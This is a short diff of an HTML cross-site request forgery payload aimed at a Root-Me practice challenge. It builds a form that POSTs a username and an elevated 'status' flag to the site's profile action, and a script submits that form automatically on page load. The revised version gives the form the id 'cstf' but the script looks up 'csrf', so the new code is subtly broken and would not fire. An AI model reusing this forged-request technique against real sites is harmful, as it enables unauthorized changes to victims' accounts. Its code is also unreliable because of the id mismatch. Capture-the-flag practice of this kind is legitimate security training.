@@ -1,9 +1,9 @@
 <html>
  <body>
- <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" enctype="multipart/form-data">
+ <form id="cstf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" enctype="multipart/form-data">
  <input type="text" name="username" value="user">
  <input type="checkbox" name="status" checked >
  </form>
+ <script>document.getElementById("csrf").submit();</script>
  </body>
- <script>document.getElementsByTagName(’form’)[0].submit();</script>
 </html>
